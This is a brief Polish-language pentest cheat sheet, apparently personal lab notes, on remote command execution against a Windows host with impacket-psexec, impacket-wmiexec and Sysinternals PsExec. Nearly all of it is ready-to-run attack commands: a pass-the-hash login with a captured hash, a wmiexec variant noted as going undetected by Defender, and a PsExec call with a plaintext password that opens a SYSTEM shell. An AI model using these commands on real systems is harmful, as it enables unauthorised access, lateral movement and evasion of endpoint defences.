---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# PsExec

**Impacket-PsExec** KALI

```
impacket-psexec cyber.local/jessicar@10.20.10.5
```

logowanie na Win za pomocą przechwyconego hasha

```
impacket-psexec -hashes ":<hash>" cyber.local/jessicar@10.20.10.5
```

alternatywne wmiexec - nie wykrywany przez Defendera, ale pół interaktywny - czyli jak nie podamy odrazu hasła to wmiexec nas o to nie spyta tylko się nie zaloguje

```
impacket-wmiexec -hashes ":<hash>" cyber.local/jessicar@10.20.10.5
```

**PsExec** WIN

```
#w folderze gdzie jest PsExec
.\PsExec.exe

#łaczenie się z kalim
.\PsExec.exe -u "jessicar" -p "Aa123456!" -s \\10.20.10.5 cmd.exe
```
